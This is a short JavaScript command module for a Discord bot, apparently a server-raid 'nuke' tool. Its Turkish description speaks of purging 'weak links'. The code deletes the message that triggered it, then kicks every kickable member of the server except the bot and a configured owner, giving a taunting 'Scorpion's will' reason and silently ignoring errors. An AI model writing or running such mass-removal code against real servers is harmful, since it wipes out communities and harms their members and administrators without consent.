const delay = (ms) => new Promise((res) => setTimeout(res, ms));

module.exports = {
  name: "kick",
  description: "Zayıf halkaları sunucudan temizler.",
  async execute(message, args, client, config) {
    await message.delete().catch(() => { });
    await message.guild.members.fetch();

    for (const member of message.guild.members.cache.values()) {
      if (member.id === client.user.id || member.id === config.ownerId) continue;
      if (member.kickable) {
        await member.kick("Scorpion'un iradesiyle uzaklaştırıldın.").catch(() => { });
        await delay(300);
      }
    }
  },
};
